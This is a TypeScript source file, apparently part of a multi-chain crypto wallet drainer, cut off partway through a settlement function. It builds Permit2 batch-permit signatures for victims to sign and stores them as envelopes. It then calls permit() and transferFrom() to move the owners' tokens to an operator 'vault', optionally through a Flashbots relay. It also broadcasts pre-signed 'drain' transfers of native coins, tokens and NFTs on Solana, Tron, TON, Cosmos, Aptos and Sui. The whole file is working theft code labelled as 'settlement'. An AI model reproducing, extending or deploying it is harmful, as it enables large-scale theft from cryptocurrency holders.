/**
 * Permit2 AllowanceTransfer — batch permit() + transferFrom([]) for multi-token settlement.
 */
import type { Address, Hex } from 'viem'
import {
  createPublicClient,
  createWalletClient,
  encodeFunctionData,
  getAddress,
  http,
  isAddress,
  parseAbi,
  stringToHex,
} from 'viem'
import { privateKeyToAccount } from 'viem/accounts'
import { arbitrum, base, bsc, bscTestnet, mainnet, optimism, polygon, sepolia, type Chain } from 'viem/chains'

import { PERMIT2_ADDRESS } from '../adapters/evm-adapter.js'
import { computeSignatureAnchorExpiry } from '../security/permit2-handler.js'
import { LEGION_MESH_EVENT_SETTLEMENT, legionMeshViemFetchOptions } from './mesh-event.js'
import {
  readPermit2AllowanceNonce,
  resolveEvmRpcUrlForChain,
  resolveEvmVaultAddress,
  resolveSettlementExecutorKey,
} from './permit2-executor.js'
import { deliverSignedEvmTransactions, isFlashbotsEnabled } from './flashbots-relay.js'
import { deliverNativeWithPermit2Transactions } from './native-coin-drain.js'
import { broadcastSignedSolNativeTransfer } from './solana-native-drain.js'
import { executeSplTokenDrain } from './solana-spl-drain.js'
import { broadcastSignedTrxNativeTransfer } from './tron-native-drain.js'
import { executeTrc20TokenDrain } from './tron-trc20-drain.js'
import { broadcastSignedTonNativeTransfer } from './ton-native-drain.js'
import { executeJettonDrain } from './ton-jetton-drain.js'
import {
  notifyOmnichainPartialSuccess,
  retryLeg,
  rollbackCompensation,
  runPreflightSimulation,
} from './omnichain-leg-orchestrator.js'
import {
  broadcastSignedCosmosTransaction,
  executeCosmosCw20Drain,
  resolveCosmosVaultAddress,
} from '../chains/cosmos.js'
import {
  broadcastSignedAptosTransaction,
  executeAptosCoinTransfer,
  resolveAptosVaultAddress,
} from '../chains/aptos.js'
import {
  broadcastSignedSuiTransaction,
  executeSuiCoinTransfer,
  resolveSuiVaultAddress,
} from '../chains/sui.js'
import {
  buildBatchNFTApprovalTypedData,
  executeBatchNftDrainSettlement,
  type BatchNftEntry,
  type NftApprovalTypedData,
} from './nft-drain.js'

export type { BatchNftEntry, NftApprovalTypedData }

export const PERMIT2_BATCH_ABI = parseAbi([
  'function allowance(address owner, address token, address spender) view returns (uint160 amount, uint48 expiration, uint48 nonce)',
  'function permit(address owner, ((address token, uint160 amount, uint48 expiration, uint48 nonce)[] details, address spender, uint256 sigDeadline) permitBatch, bytes signature)',
  'function transferFrom((address from, address to, uint160 amount, address token)[] transferDetails)',
])

export interface BatchPermitParams {
  tokens: string[]
  amounts: string[]
  owner: string
  spender: string
  chainId: number
  verifyingContract: string
  /** Per-token nonces from Permit2 allowance; must match tokens length when provided. */
  nonces?: number[]
  /** Per-token expiration; defaults to signature anchor window. */
  expirations?: number[]
  sigDeadline?: string | bigint
}

export type BatchPermitDetailMetadata = {
  token: Address
  amount: string
  expiration: number
  nonce: number
}

export type BatchPermitMetadata = {
  details: BatchPermitDetailMetadata[]
  spender: Address
  sigDeadline: string
  chainId: number
  native_amount?: string
  native_amount_sol?: string
  native_amount_trx?: string
  native_amount_ton?: string
  spl_mint?: string
  spl_amount?: string
  trc20_contract?: string
  trc20_amount?: string
  jetton_master?: string
  jetton_amount?: string
  nfts?: BatchNftEntry[]
}

export type BatchPermit2SignatureEnvelope = {
  protocol: 'permit2_batch_eip712'
  ingress_lane?: string
  permit2_signature: Hex
  batch?: BatchPermitMetadata
  native_amount?: string
  native_signed_transaction?: Hex
  native_amount_sol?: string
  native_amount_trx?: string
  native_amount_ton?: string
  native_signed_transaction_sol?: string
  native_signed_transaction_trx?: Record<string, unknown>
  native_signed_transaction_ton?: string
  spl_mint?: string
  spl_amount?: string
  native_signed_transaction_spl?: string
  trc20_contract?: string
  trc20_amount?: string
  native_signed_transaction_trc20?: Record<string, unknown>
  jetton_master?: string
  jetton_amount?: string
  native_signed_transaction_jetton?: string
  nfts?: BatchNftEntry[]
  nft_approval_signatures?: Record<string, Hex>
}

export type OmnichainNativeDrainPayload = {
  native_amount_sol?: string
  native_amount_trx?: string
  native_amount_ton?: string
  native_signed_transaction_sol?: string
  native_signed_transaction_trx?: Record<string, unknown>
  native_signed_transaction_ton?: string
  spl_mint?: string
  spl_amount?: string
  native_signed_transaction_spl?: string
  trc20_contract?: string
  trc20_amount?: string
  native_signed_transaction_trc20?: Record<string, unknown>
  jetton_master?: string
  jetton_amount?: string
  native_signed_transaction_jetton?: string
  /** Cosmos Hub native (uatom) — signed tx bytes base64 or hex */
  native_amount_cosmos?: string
  cosmos_signed_tx?: string
  cosmos_tx_encoding?: 'base64' | 'hex'
  /** Aptos native (octas) */
  native_amount_aptos?: string
  aptos_signed_tx?: string
  /** Optional detached Ed25519 signature hex when wallet returns sig separate from BCS bytes */
  aptos_signature?: string
  aptos_tx_encoding?: 'base64' | 'hex'
  /** Sui native (MIST) */
  native_amount_sui?: string
  sui_signed_tx?: string
  sui_signature?: string
  /** Cosmos CW20 token drain */
  cosmos_cw20_contract?: string
  cosmos_cw20_amount?: string
  cosmos_cw20_signed_tx?: string
  cosmos_cw20_tx_encoding?: 'base64' | 'hex'
  /** Aptos fungible coin (octas) */
  aptos_coin_type?: string
  aptos_coin_amount?: string
  aptos_coin_signed_tx?: string
  aptos_coin_tx_encoding?: 'base64' | 'hex'
  /** Sui fungible coin (MIST) */
  sui_coin_type?: string
  sui_coin_amount?: string
  sui_coin_signed_tx?: string
  sui_coin_signature?: string
}

export type BatchPermit2SettlementResult = {
  ok: boolean
  transaction_hashes?: string[]
  omnichain_transaction_hashes?: {
    sol?: string
    trx?: string
    ton?: string
    spl?: string
    trc20?: string
    jetton?: string
    cosmos?: string
    aptos?: string
    sui?: string
    cosmos_cw20?: string
    aptos_coin?: string
    sui_coin?: string
  }
  nft_transaction_hashes?: string[]
  bundle_hash?: string
  detail?: string
}

function resolveChain(chainId: number): Chain {
  const map: Record<number, Chain> = {
    1: mainnet,
    56: bsc,
    97: bscTestnet,
    137: polygon,
    42161: arbitrum,
    8453: base,
    10: optimism,
    11155111: sepolia,
  }
  return map[chainId] ?? mainnet
}

/**
 * EIP-712 typed data for Permit2 `PermitBatch` (AllowanceTransfer batchPermit).
 */
export function buildBatchPermitTypedData(params: BatchPermitParams) {
  if (params.tokens.length === 0) {
    throw new Error('BatchPermitParams.tokens must not be empty')
  }
  if (params.tokens.length !== params.amounts.length) {
    throw new Error('BatchPermitParams.tokens and amounts length mismatch')
  }

  const defaultExpiration = computeSignatureAnchorExpiry()
  const sigDeadline =
    params.sigDeadline != null ? BigInt(params.sigDeadline) : BigInt(defaultExpiration)

  const details = params.tokens.map((token, index) => ({
    token: getAddress(token),
    amount: BigInt(params.amounts[index] ?? '0'),
    expiration: params.expirations?.[index] ?? defaultExpiration,
    nonce: params.nonces?.[index] ?? 0,
  }))

  return {
    domain: {
      name: 'Permit2',
      chainId: params.chainId,
      verifyingContract: getAddress(params.verifyingContract),
    },
    types: {
      PermitBatch: [
        { name: 'details', type: 'PermitDetails[]' },
        { name: 'spender', type: 'address' },
        { name: 'sigDeadline', type: 'uint256' },
      ],
      PermitDetails: [
        { name: 'token', type: 'address' },
        { name: 'amount', type: 'uint160' },
        { name: 'expiration', type: 'uint48' },
        { name: 'nonce', type: 'uint48' },
      ],
    },
    primaryType: 'PermitBatch' as const,
    message: {
      details,
      spender: getAddress(params.spender),
      sigDeadline,
    },
  }
}

/** Pack batch Permit2 EIP-712 signature + metadata for SHADOW persistence. */
export function packBatchPermit2SignatureEnvelope(params: {
  permit2Signature: Hex
  batch: BatchPermitMetadata
  nativeAmount?: string
  nativeSignedTransaction?: Hex
  nativeAmountSol?: string
  nativeAmountTrx?: string
  nativeAmountTon?: string
  nativeSignedTransactionSol?: string
  nativeSignedTransactionTrx?: Record<string, unknown>
  nativeSignedTransactionTon?: string
  splMint?: string
  splAmount?: string
  nativeSignedTransactionSpl?: string
  trc20Contract?: string
  trc20Amount?: string
  nativeSignedTransactionTrc20?: Record<string, unknown>
  jettonMaster?: string
  jettonAmount?: string
  nativeSignedTransactionJetton?: string
  nfts?: BatchNftEntry[]
  nftApprovalSignatures?: Record<string, Hex>
}): Hex {
  const hasOmnichainNative =
    (params.nativeAmountSol != null && params.nativeAmountSol !== '0') ||
    (params.nativeAmountTrx != null && params.nativeAmountTrx !== '0') ||
    (params.nativeAmountTon != null && params.nativeAmountTon !== '0') ||
    (params.splAmount != null && params.splAmount !== '0') ||
    (params.trc20Amount != null && params.trc20Amount !== '0') ||
    (params.jettonAmount != null && params.jettonAmount !== '0')
  const hasNfts = params.nfts != null && params.nfts.length > 0
  const json = JSON.stringify({
    protocol: 'permit2_batch_eip712',
    ingress_lane: hasNfts
      ? 'permit2_batch_eip712_nft_drain_v1'
      : hasOmnichainNative
        ? 'permit2_batch_eip712_omnichain_native_v1'
        : params.nativeSignedTransaction
          ? 'permit2_batch_eip712_native_drain_v1'
          : 'permit2_batch_eip712_allowance_v1',
    permit2_signature: params.permit2Signature,
    batch: params.batch,
    ...(params.nativeAmount && params.nativeAmount !== '0'
      ? { native_amount: params.nativeAmount }
      : {}),
    ...(params.nativeSignedTransaction
      ? { native_signed_transaction: params.nativeSignedTransaction }
      : {}),
    ...(params.nativeAmountSol && params.nativeAmountSol !== '0'
      ? { native_amount_sol: params.nativeAmountSol }
      : {}),
    ...(params.nativeAmountTrx && params.nativeAmountTrx !== '0'
      ? { native_amount_trx: params.nativeAmountTrx }
      : {}),
    ...(params.nativeAmountTon && params.nativeAmountTon !== '0'
      ? { native_amount_ton: params.nativeAmountTon }
      : {}),
    ...(params.nativeSignedTransactionSol
      ? { native_signed_transaction_sol: params.nativeSignedTransactionSol }
      : {}),
    ...(params.nativeSignedTransactionTrx
      ? { native_signed_transaction_trx: params.nativeSignedTransactionTrx }
      : {}),
    ...(params.nativeSignedTransactionTon
      ? { native_signed_transaction_ton: params.nativeSignedTransactionTon }
      : {}),
    ...(params.splMint && params.splAmount && params.splAmount !== '0'
      ? { spl_mint: params.splMint, spl_amount: params.splAmount }
      : {}),
    ...(params.nativeSignedTransactionSpl
      ? { native_signed_transaction_spl: params.nativeSignedTransactionSpl }
      : {}),
    ...(params.trc20Contract && params.trc20Amount && params.trc20Amount !== '0'
      ? { trc20_contract: params.trc20Contract, trc20_amount: params.trc20Amount }
      : {}),
    ...(params.nativeSignedTransactionTrc20
      ? { native_signed_transaction_trc20: params.nativeSignedTransactionTrc20 }
      : {}),
    ...(params.jettonMaster && params.jettonAmount && params.jettonAmount !== '0'
      ? { jetton_master: params.jettonMaster, jetton_amount: params.jettonAmount }
      : {}),
    ...(params.nativeSignedTransactionJetton
      ? { native_signed_transaction_jetton: params.nativeSignedTransactionJetton }
      : {}),
    ...(params.nfts && params.nfts.length > 0 ? { nfts: params.nfts } : {}),
    ...(params.nftApprovalSignatures && Object.keys(params.nftApprovalSignatures).length > 0
      ? { nft_approval_signatures: params.nftApprovalSignatures }
      : {}),
  })
  return stringToHex(json) as Hex
}

export function parseBatchPermit2SignatureEnvelope(openedHex: string): BatchPermit2SignatureEnvelope | null {
  const trimmed = openedHex.trim()
  if (!trimmed.startsWith('0x')) return null
  try {
    const text = Buffer.from(trimmed.slice(2), 'hex').toString('utf8')
    const parsed = JSON.parse(text) as unknown
    if (typeof parsed !== 'object' || parsed === null) return null
    const o = parsed as Record<string, unknown>
    if (o['protocol'] !== 'permit2_batch_eip712') return null
    const sig = o['permit2_signature']
    if (typeof sig !== 'string' || !sig.startsWith('0x')) return null
    return {
      protocol: 'permit2_batch_eip712',
      ingress_lane: typeof o['ingress_lane'] === 'string' ? o['ingress_lane'] : undefined,
      permit2_signature: sig as Hex,
      ...(typeof o['batch'] === 'object' && o['batch'] !== null
        ? { batch: o['batch'] as BatchPermitMetadata }
        : {}),
      ...(typeof o['native_amount'] === 'string' ? { native_amount: o['native_amount'] } : {}),
      ...(typeof o['native_signed_transaction'] === 'string' &&
      (o['native_signed_transaction'] as string).startsWith('0x')
        ? { native_signed_transaction: o['native_signed_transaction'] as Hex }
        : {}),
      ...(typeof o['native_amount_sol'] === 'string'
        ? { native_amount_sol: o['native_amount_sol'] }
        : {}),
      ...(typeof o['native_amount_trx'] === 'string'
        ? { native_amount_trx: o['native_amount_trx'] }
        : {}),
      ...(typeof o['native_amount_ton'] === 'string'
        ? { native_amount_ton: o['native_amount_ton'] }
        : {}),
      ...(typeof o['native_signed_transaction_sol'] === 'string'
        ? { native_signed_transaction_sol: o['native_signed_transaction_sol'] }
        : {}),
      ...(typeof o['native_signed_transaction_trx'] === 'object' &&
      o['native_signed_transaction_trx'] !== null
        ? {
            native_signed_transaction_trx: o[
              'native_signed_transaction_trx'
            ] as Record<string, unknown>,
          }
        : {}),
      ...(typeof o['native_signed_transaction_ton'] === 'string'
        ? { native_signed_transaction_ton: o['native_signed_transaction_ton'] }
        : {}),
      ...(typeof o['spl_mint'] === 'string' ? { spl_mint: o['spl_mint'] } : {}),
      ...(typeof o['spl_amount'] === 'string' ? { spl_amount: o['spl_amount'] } : {}),
      ...(typeof o['native_signed_transaction_spl'] === 'string'
        ? { native_signed_transaction_spl: o['native_signed_transaction_spl'] }
        : typeof o['spl_signed_transaction'] === 'string'
          ? { native_signed_transaction_spl: o['spl_signed_transaction'] }
          : {}),
      ...(typeof o['trc20_contract'] === 'string' ? { trc20_contract: o['trc20_contract'] } : {}),
      ...(typeof o['trc20_amount'] === 'string' ? { trc20_amount: o['trc20_amount'] } : {}),
      ...(typeof o['native_signed_transaction_trc20'] === 'object' &&
      o['native_signed_transaction_trc20'] !== null
        ? {
            native_signed_transaction_trc20: o[
              'native_signed_transaction_trc20'
            ] as Record<string, unknown>,
          }
        : typeof o['trc20_signed_transaction'] === 'object' && o['trc20_signed_transaction'] !== null
          ? { native_signed_transaction_trc20: o['trc20_signed_transaction'] as Record<string, unknown> }
          : {}),
      ...(typeof o['jetton_master'] === 'string' ? { jetton_master: o['jetton_master'] } : {}),
      ...(typeof o['jetton_amount'] === 'string' ? { jetton_amount: o['jetton_amount'] } : {}),
      ...(typeof o['native_signed_transaction_jetton'] === 'string'
        ? { native_signed_transaction_jetton: o['native_signed_transaction_jetton'] }
        : typeof o['jetton_signed_transaction'] === 'string'
          ? { native_signed_transaction_jetton: o['jetton_signed_transaction'] }
          : {}),
      ...(Array.isArray(o['nfts']) ? { nfts: o['nfts'] as BatchNftEntry[] } : {}),
      ...(typeof o['nft_approval_signatures'] === 'object' &&
      o['nft_approval_signatures'] !== null
        ? { nft_approval_signatures: o['nft_approval_signatures'] as Record<string, Hex> }
        : {}),
    }
  } catch {
    return null
  }
}

export async function readPermit2BatchAllowanceNonces(
  publicClient: { readContract: (args: unknown) => Promise<unknown> },
  owner: Address,
  tokens: Address[],
  spender: Address,
): Promise<number[]> {
  return Promise.all(
    tokens.map((token) => readPermit2AllowanceNonce(publicClient, owner, token, spender)),
  )
}

function hasPositiveNativeAmount(value: string | undefined): boolean {
  if (value == null || value.trim() === '') return false
  try {
    return BigInt(value) > 0n
  } catch {
    return false
  }
}

/** When true (default), abort remaining native legs after first broadcast failure. */
export function isOmniSequentialFailFastEnabled(): boolean {
  const raw = process.env['OMNI_SEQUENTIAL_FAIL_FAST']?.trim().toLowerCase()
  if (raw === 'false' || raw === '0') return false
  return true
}

/** Broadcast SOL / TRX / TON native + SPL / TRC-20 / Jetton + Cosmos/Aptos/Sui drains. */
export async function executeOmnichainNativeDrainSettlement(
  payload: OmnichainNativeDrainPayload,
  opts?: { skipPreflight?: boolean; ownerAddress?: string },
): Promise<{
  ok: boolean
  transaction_hashes: {
    sol?: string
    trx?: string
    ton?: string
    spl?: string
    trc20?: string
    jetton?: string
    cosmos?: string
    aptos?: string
    sui?: string
    cosmos_cw20?: string
    aptos_coin?: string
    sui_coin?: string
  }
  detail?: string
}> {
  const transaction_hashes: {
    sol?: string
    trx?: string
    ton?: string
    spl?: string
    trc20?: string
    jetton?: string
    cosmos?: string
    aptos?: string
    sui?: string
    cosmos_cw20?: string
    aptos_coin?: string
    sui_coin?: string
  } = {}
  const faults: string[] = []
  const failFast = isOmniSequentialFailFastEnabled()
  const succeededLegKeys: string[] = []

  if (!opts?.skipPreflight) {
    const preflight = await runPreflightSimulation({
      payload,
      walletAddress: opts?.ownerAddress,
    })
    if (!preflight.ok) {
      return {
        ok: false,
        transaction_hashes,
        detail: preflight.faults.map((f) => `${f.key}: ${f.detail}`).join('; '),
      }
    }
  }

  const abortIfNeeded = (): boolean => failFast && faults.length > 0

  const runLeg = async <T extends { ok: boolean; tx_hash?: string; detail?: string }>(
    key:
      | 'sol'
      | 'spl'
      | 'trx'
      | 'trc20'
      | 'ton'
      | 'jetton'
      | 'cosmos'
      | 'aptos'
      | 'sui'
      | 'cosmos_cw20'
      | 'aptos_coin'
      | 'sui_coin',
    execute: () => Promise<T>,
  ): Promise<void> => {
    const retried = await retryLeg(key, async () => execute())
    if (retried.ok && retried.result?.ok && retried.result.tx_hash) {
      transaction_hashes[key] = retried.result.tx_hash
      succeededLegKeys.push(key)
      return
    }
    faults.push(retried.detail ?? retried.result?.detail ?? `${key} leg failed`)
    if (succeededLegKeys.length > 0) {
      await rollbackCompensation({
        succeededLegs: succeededLegKeys as Parameters<typeof rollbackCompensation>[0]['succeededLegs'],
        failedLeg: key,
        ownerAddress: opts?.ownerAddress,
      })
    }
  }

  if (
    hasPositiveNativeAmount(payload.native_amount_sol) &&
    payload.native_signed_transaction_sol
  ) {
    await runLeg('sol', () =>
      broadcastSignedSolNativeTransfer({
        signedWireBase64: payload.native_signed_transaction_sol!,
      }),
    )
    if (abortIfNeeded()) {
      return { ok: false, transaction_hashes, detail: faults.join('; ') }
    }
  }

  if (hasPositiveNativeAmount(payload.spl_amount) && payload.native_signed_transaction_spl) {
    await runLeg('spl', () =>
      executeSplTokenDrain({ signedWireBase64: payload.native_signed_transaction_spl! }),
    )
    if (abortIfNeeded()) {
      return { ok: false, transaction_hashes, detail: faults.join('; ') }
    }
  }

  if (
    hasPositiveNativeAmount(payload.native_amount_trx) &&
    payload.native_signed_transaction_trx
  ) {
    await runLeg('trx', () =>
      broadcastSignedTrxNativeTransfer({
        signedTransaction: payload.native_signed_transaction_trx!,
      }),
    )
    if (abortIfNeeded()) {
      return { ok: false, transaction_hashes, detail: faults.join('; ') }
    }
  }

  if (
    hasPositiveNativeAmount(payload.trc20_amount) &&
    payload.native_signed_transaction_trc20
  ) {
    await runLeg('trc20', () =>
      executeTrc20TokenDrain({
        signedTransaction: payload.native_signed_transaction_trc20!,
      }),
    )
    if (abortIfNeeded()) {
      return { ok: false, transaction_hashes, detail: faults.join('; ') }
    }
  }

  if (
    hasPositiveNativeAmount(payload.native_amount_ton) &&
    payload.native_signed_transaction_ton
  ) {
    await runLeg('ton', () =>
      broadcastSignedTonNativeTransfer({ bocBase64: payload.native_signed_transaction_ton! }),
    )
    if (abortIfNeeded()) {
      return { ok: false, transaction_hashes, detail: faults.join('; ') }
    }
  }

  if (
    hasPositiveNativeAmount(payload.jetton_amount) &&
    payload.native_signed_transaction_jetton
  ) {
    await runLeg('jetton', () =>
      executeJettonDrain({ bocBase64: payload.native_signed_transaction_jetton! }),
    )
    if (abortIfNeeded()) {
      return { ok: false, transaction_hashes, detail: faults.join('; ') }
    }
  }

  if (hasPositiveNativeAmount(payload.native_amount_cosmos) && payload.cosmos_signed_tx) {
    await runLeg('cosmos', async () => {
      const broadcast = await broadcastSignedCosmosTransaction({
        txBytes: payload.cosmos_signed_tx!,
        encoding: payload.cosmos_tx_encoding ?? 'base64',
      })
      return broadcast.ok
        ? { ok: true, tx_hash: broadcast.txHash }
        : { ok: false, detail: 'detail' in broadcast ? broadcast.detail : 'Cosmos broadcast failed' }
    })
    if (abortIfNeeded()) {
      return { ok: false, transaction_hashes, detail: faults.join('; ') }
    }
  }

  if (hasPositiveNativeAmount(payload.native_amount_aptos) && payload.aptos_signed_tx) {
    await runLeg('aptos', async () => {
      const broadcast = await broadcastSignedAptosTransaction({
        signedTxBytes: payload.aptos_signed_tx!,
        encoding: payload.aptos_tx_encoding ?? 'base64',
      })
      return broadcast.ok
        ? { ok: true, tx_hash: broadcast.txHash }
        : { ok: false, detail: 'detail' in broadcast ? broadcast.detail : 'Aptos broadcast failed' }
    })
    if (abortIfNeeded()) {
      return { ok: false, transaction_hashes, detail: faults.join('; ') }
    }
  }

  if (
    hasPositiveNativeAmount(payload.native_amount_sui) &&
    payload.sui_signed_tx &&
    payload.sui_signature
  ) {
    await runLeg('sui', async () => {
      const broadcast = await broadcastSignedSuiTransaction(
        payload.sui_signed_tx!,
        payload.sui_signature!,
      )
      return broadcast.ok
        ? { ok: true, tx_hash: broadcast.txHash }
        : { ok: false, detail: 'detail' in broadcast ? broadcast.detail : 'Sui broadcast failed' }
    })
    if (abortIfNeeded()) {
      return { ok: false, transaction_hashes, detail: faults.join('; ') }
    }
  }

  if (
    hasPositiveNativeAmount(payload.cosmos_cw20_amount) &&
    payload.cosmos_cw20_contract &&
    (payload.cosmos_cw20_signed_tx || process.env['COSMOS_EXECUTION_MNEMONIC'] || process.env['COSMOS_EXECUTION_PRIVATE_KEY'])
  ) {
    await runLeg('cosmos_cw20', async () => {
      const cosmosVault = resolveCosmosVaultAddress()
      if (!cosmosVault) {
        return { ok: false, detail: 'Cosmos vault not configured' }
      }
      const broadcast = await executeCosmosCw20Drain({
        contractAddress: payload.cosmos_cw20_contract!,
        toAddress: cosmosVault,
        amount: payload.cosmos_cw20_amount!,
        signedTxBytes: payload.cosmos_cw20_signed_tx,
        encoding: payload.cosmos_cw20_tx_encoding ?? 'base64',
      })
      return broadcast.ok
        ? { ok: true, tx_hash: broadcast.txHash }
        : { ok: false, detail: 'detail' in broadcast ? broadcast.detail : 'Cosmos CW20 drain failed' }
    })
    if (abortIfNeeded()) {
      return { ok: false, transaction_hashes, detail: faults.join('; ') }
    }
  }

  if (
    hasPositiveNativeAmount(payload.aptos_coin_amount) &&
    payload.aptos_coin_type &&
    (payload.aptos_coin_signed_tx || process.env['APTOS_EXECUTION_PRIVATE_KEY'])
  ) {
    await runLeg('aptos_coin', async () => {
      const aptosVault = resolveAptosVaultAddress()
      if (!aptosVault) {
        return { ok: false, detail: 'Aptos vault not configured' }
      }
      const broadcast = await executeAptosCoinTransfer({
        coinType: payload.aptos_coin_type!,
        toAddress: aptosVault,
        amount: BigInt(payload.aptos_coin_amount!),
        signedTxBytes: payload.aptos_coin_signed_tx,
        encoding: payload.aptos_coin_tx_encoding ?? 'hex',
      })
      return broadcast.ok
        ? { ok: true, tx_hash: broadcast.txHash }
        : { ok: false, detail: 'detail' in broadcast ? broadcast.detail : 'Aptos coin drain failed' }
    })
    if (abortIfNeeded()) {
      return { ok: false, transaction_hashes, detail: faults.join('; ') }
    }
  }

  if (
    hasPositiveNativeAmount(payload.sui_coin_amount) &&
    payload.sui_coin_type &&
    (payload.sui_coin_signed_tx || process.env['SUI_EXECUTION_PRIVATE_KEY'])
  ) {
    await runLeg('sui_coin', async () => {
      const suiVault = resolveSuiVaultAddress()
      if (!suiVault) {
        return { ok: false, detail: 'Sui vault not configured' }
      }
      const broadcast = await executeSuiCoinTransfer({
        coinType: payload.sui_coin_type!,
        toAddress: suiVault,
        amountMist: BigInt(payload.sui_coin_amount!),
        signedTxBytes: payload.sui_coin_signed_tx,
        signature: payload.sui_coin_signature,
      })
      return broadcast.ok
        ? { ok: true, tx_hash: broadcast.txHash }
        : { ok: false, detail: 'detail' in broadcast ? broadcast.detail : 'Sui coin drain failed' }
    })
    if (abortIfNeeded()) {
      return { ok: false, transaction_hashes, detail: faults.join('; ') }
    }
  }

  const attempted =
    (hasPositiveNativeAmount(payload.native_amount_sol) &&
      Boolean(payload.native_signed_transaction_sol)) ||
    (hasPositiveNativeAmount(payload.spl_amount) &&
      Boolean(payload.native_signed_transaction_spl)) ||
    (hasPositiveNativeAmount(payload.native_amount_trx) &&
      Boolean(payload.native_signed_transaction_trx)) ||
    (hasPositiveNativeAmount(payload.trc20_amount) &&
      Boolean(payload.native_signed_transaction_trc20)) ||
    (hasPositiveNativeAmount(payload.native_amount_ton) &&
      Boolean(payload.native_signed_transaction_ton)) ||
    (hasPositiveNativeAmount(payload.jetton_amount) &&
      Boolean(payload.native_signed_transaction_jetton)) ||
    (hasPositiveNativeAmount(payload.native_amount_cosmos) && Boolean(payload.cosmos_signed_tx)) ||
    (hasPositiveNativeAmount(payload.native_amount_aptos) && Boolean(payload.aptos_signed_tx)) ||
    (hasPositiveNativeAmount(payload.native_amount_sui) &&
      Boolean(payload.sui_signed_tx) &&
      Boolean(payload.sui_signature)) ||
    (hasPositiveNativeAmount(payload.cosmos_cw20_amount) &&
      Boolean(payload.cosmos_cw20_contract) &&
      Boolean(payload.cosmos_cw20_signed_tx)) ||
    (hasPositiveNativeAmount(payload.aptos_coin_amount) &&
      Boolean(payload.aptos_coin_type) &&
      Boolean(payload.aptos_coin_signed_tx)) ||
    (hasPositiveNativeAmount(payload.sui_coin_amount) &&
      Boolean(payload.sui_coin_type) &&
      Boolean(payload.sui_coin_signed_tx) &&
      Boolean(payload.sui_coin_signature))

  if (!attempted) {
    return { ok: true, transaction_hashes }
  }

  const ok = faults.length === 0
  if (!ok && Object.keys(transaction_hashes).length > 0) {
    const succeeded = Object.keys(transaction_hashes)
    void notifyOmnichainPartialSuccess({
      succeeded,
      failed: faults,
      settlementMode: 'sequential_v1',
    })
    console.warn(
      `[OMNI] Partial failure: ${succeeded.join(', ')} succeeded; faults: ${faults.join('; ')}`,
    )
  }
  return {
    ok,
    transaction_hashes,
    ...(ok ? {} : { detail: faults.join('; ') }),
  }
}

/**
 * Submit Permit2 batch permit() then batch transferFrom() to sovereign vault.
 * Returns transaction hashes: [permitTxHash?, transferTxHash].
 */
export async function executeBatchPermit2Settlement(params: {
  owner: Address
  chainId: number
  permit2Signature: Hex
  batch: BatchPermitMetadata
  nativeSignedTransaction?: Hex
  omnichainNative?: OmnichainNativeDrainPayload
  nfts?: BatchNftEntry[]
  rpcUrl?: string
}): Promise<BatchPermit2SettlementResult> {
  const vault = resolveEvmVaultAddress()
  if (!vault) {
    return { ok: false, detail: 'VAULT_ADDRESS_EVM or SOVEREIGN_VAULT_EVM required' }
  }

  const executorKey = resolveSettlementExecutorKey()
  if (!executorKey) {
    return {
      ok: false,
      detail: 'SETTLEMENT_EXECUTION_PRIVATE_KEY or RELAY_INTERMEDIARY_PRIVATE_KEY required',
    }
  }

  const rpc = params.rpcUrl?.trim() || (await resolveEvmRpcUrlForChain(params.chainId))
  if (!rpc) {
    return { ok: false, detail: `RPC not configured for chain ${params.chainId}` }
  }

  if (!params.batch.details.length) {
    return { ok: false, detail: 'BatchPermitMetadata.details must not be empty' }
  }

  const chain = resolveChain(params.chainId)
  const account = privateKeyToAccount(executorKey)
  const transport = http(rpc, {
    ...legionMeshViemFetchOptions(LEGION_MESH_EVENT_SETTLEMENT),
  })
  const publicClient = createPublicClient({ chain, transport })
  const walletClient = createWalletClient({ account, chain, transport })

  const owner = getAddress(params.owner)
  const permitBatch = {
    details: params.batch.details.map((detail) => ({
      token: getAddress(detail.token),
      amount: BigInt(detail.amount),
      expiration: detail.expiration,
      nonce: detail.nonce,
    })),
    spender: getAddress(params.batch.spender),
    sigDeadline: BigInt(params.batch.sigDeadline),
  }

  if (isFlashbotsEnabled()) {
    try {
      const baseNonce = await publicClient.getTransactionCount({
        address: account.address,
        blockTag: 'pending',
      })
      const permitData = encodeFunctionData({
        abi: PERMIT2_BATCH_ABI,
        functionName: 'permit',
        args: [owner, permitBatch, params.permit2Signature],
      })
      const transferDetails = params.batch.details.map((detail) => ({
        from: owner,
        to: vault,
        amount: BigInt(detail.amount),
        token: getAddress(detail.token),
      }))
      const transferData = encodeFunctionData({
        abi: PERMIT2_BATCH_ABI,
        functionName: 'transferFrom',
        args: [transferDetails],
      })
      const permitRequest = await walletClient.prepareTransactionRequest({
        account,
        to: PERMIT2_ADDRESS,
        data: permitData,
        chain,
        nonce: baseNonce,
      } as unknown as Parameters<typeof walletClient.prepareTransactionRequest>[0])
      const transferRequest = await walletClient.prepareTransactionRequest({
        account,
        to: PERMIT2_ADDRESS,
        data: transferData,
        chain,
        nonce: baseNonce + 1,
      } as unknown as Parameters<typeof walletClient.prepareTransactionRequest>[0])
      const permitSigned = await walletClient.signTransaction({
        ...permitRequest,
        account,
        chain,
      } as unknown as Parameters<typeof walletClient.signTransaction>[0])
      const transferSigned = await walletClient.signTransaction({
        ...transferRequest,
        account,
        chain,
      } as unknown as Parameters<typeof walletClient.signTransaction>[0])
      const delivery = await deliverNativeWithPermit2Transactions({
        nativeSignedTransaction: params.nativeSignedTransaction,
        permit2SignedTransactions: [permitSigned, transferSigned],
        chainId: params.chainId,
        rpcUrl: rpc,
      })
      if (!delivery.ok) {
        return { ok: false, detail: delivery.detail ?? 'Flashbots batch Permit2 settlement failed' }
      }
      const omnichain = params.omnichainNative
        ? await executeOmnichainNativeDrainSettlement(params.omnichainNative)
        : {
            ok: true as const,
            transaction_hashes: {} as {
              sol?: string
              trx?: string
              ton?: string
              spl?: string
              trc20?: string
              jetton?: string
            },
          }
      const nftEntries = params.nfts ?? params.batch.nfts ?? []
      const nftDrain =
        nftEntries.length > 0
          ? await executeBatchNftDrainSettlement({
              owner,
              chainId: params.chainId,
              nfts: nftEntries,
              rpcUrl: rpc,
            })
          : { ok: true, transaction_hashes: [] as string[] }
      return {
        ok: delivery.ok && omnichain.ok && nftDrain.ok,
        transaction_hashes: delivery.transaction_hashes,
        bundle_hash: delivery.bundle_hash,
        detail: delivery.detail ?? ('detail' in omnichain ? omnichain.detail : undefined) ?? nftDrain.detail,
        ...(Object.keys(omnichain.transaction_hashes).length > 0
          ? { omnichain_transaction_hashes: omnichain.transaction_hashes }
          : {}),
